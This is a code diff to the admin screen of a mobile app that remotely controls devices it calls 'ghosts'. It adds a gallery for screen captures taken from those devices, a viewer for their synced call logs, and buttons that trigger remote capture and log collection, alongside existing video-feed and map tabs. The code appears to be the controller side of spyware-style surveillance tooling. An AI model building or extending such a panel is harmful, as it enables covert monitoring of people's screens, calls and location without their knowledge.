@@ -7,12 +7,14 @@ import StatusCard from '../components/StatusCard';
 import VideoFeed from '../components/VideoFeed';
 import LogConsole from '../components/LogConsole';
 import TacticalMap from '../components/TacticalMap';
+import SnapshotGallery from '../components/SnapshotGallery';
+import CallLogViewer from '../components/CallLogViewer';
 
 const AdminScreen = ({ onLogout, name }) => {
   const [ghosts, setGhosts] = useState({});
   const [logs, setLogs] = useState([]);
   const [selectedGhostId, setSelectedGhostId] = useState(null);
-  const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, LOGS
+  const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, CALLS, LOGS
 
   const selectedGhost = selectedGhostId ? ghosts[selectedGhostId] : null;
 
@@ -60,9 +62,29 @@ const AdminScreen = ({ onLogout, name }) => {
 
     socket.on('ghost_activity', (payload) => {
       if (payload.type === 'SNAPSHOT') {
+        setGhosts(prev => ({
+          ...prev,
+          [payload.name]: {
+            ...prev[payload.name],
+            snapshots: [{ id: Date.now().toString(), uri: payload.data, timestamp: new Date().toLocaleTimeString() }, ...(prev[payload.name]?.snapshots || [])]
+          }
+        }));
         setLogs(prev => [...prev, { 
           type: 'SYSTEM', 
           message: `SNAPSHOT RECEIVED FROM ${payload.name}`, 
+          timestamp: new Date().toLocaleTimeString() 
+        }]);
+      } else if (payload.type === 'LOG_SYNC') {
+        setGhosts(prev => ({
+          ...prev,
+          [payload.name]: {
+            ...prev[payload.name],
+            callLogs: payload.data
+          }
+        }));
+        setLogs(prev => [...prev, { 
+          type: 'SYSTEM', 
+          message: `TELEMETRY SYNCED FROM ${payload.name}`, 
           timestamp: new Date().toLocaleTimeString() 
         }]);
       }
@@ -119,15 +141,17 @@ const AdminScreen = ({ onLogout, name }) => {
         <>
           {/* TAB NAVIGATION */}
           <View style={styles.tabBar}>
-            {['FEED', 'MAP', 'SNAPS', 'LOGS'].map(tab => (
-              <TouchableOpacity 
-                key={tab} 
-                style={[styles.tab, activeTab === tab && styles.tabActive]}
-                onPress={() => setActiveTab(tab)}
-              >
-                <Text style={[styles.tabText, activeTab === tab && styles.tabTextActive]}>{tab}</Text>
-              </TouchableOpacity>
-            ))}
+            <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.tabScroll}>
+              {['FEED', 'MAP', 'SNAPS', 'CALLS', 'LOGS'].map(tab => (
+                <TouchableOpacity 
+                  key={tab} 
+                  style={[styles.tab, activeTab === tab && styles.tabActive]}
+                  onPress={() => setActiveTab(tab)}
+                >
+                  <Text style={[styles.tabText, activeTab === tab && styles.tabTextActive]}>{tab}</Text>
+                </TouchableOpacity>
+              ))}
+            </ScrollView>
           </View>
 
           {/* TAB CONTENT */}
@@ -161,12 +185,18 @@ const AdminScreen = ({ onLogout, name }) => {
 
             {activeTab === 'SNAPS' && (
               <View style={styles.tabSection}>
-                <Text style={styles.sectionLabel}>SCREEN CAPTURE LOGS</Text>
-                <View style={styles.snapPlaceholder}>
-                  <Text style={styles.placeholderText}>NO RECENT DATA</Text>
-                </View>
+                <SnapshotGallery ghostName={selectedGhost.name} snapshots={selectedGhost.snapshots || []} />
+                <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
+                  <Text style={styles.btnTxt}>TRIGGER REMOTE CAPTURE</Text>
+                </TouchableOpacity>
+              </View>
+            )}
+
+            {activeTab === 'CALLS' && (
+              <View style={styles.tabSection}>
+                <CallLogViewer logs={selectedGhost.callLogs || []} />
                 <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'LOG_SYNC')}>
-                  <Text style={styles.btnTxt}>SYNC RECORDS</Text>
+                  <Text style={styles.btnTxt}>SYNC TELEMETRY</Text>
                 </TouchableOpacity>
               </View>
             )}
@@ -209,8 +239,9 @@ const styles = StyleSheet.create({
   emptyText: { color: '#222', fontSize: 9, letterSpacing: 2, padding: 5 },
 
   // Tabs
-  tabBar: { flexDirection: 'row', backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
-  tab: { flex: 1, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
+  tabBar: { backgroundColor: '#050505', borderBottomWidth: 1, borderBottomColor: '#111' },
+  tabScroll: { flexDirection: 'row' },
+  tab: { paddingHorizontal: 20, paddingVertical: 12, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: 'transparent' },
   tabActive: { borderBottomColor: '#00ff00' },
   tabText: { color: '#444', fontSize: 9, fontWeight: 'bold', letterSpacing: 1 },
   tabTextActive: { color: '#00ff00' },
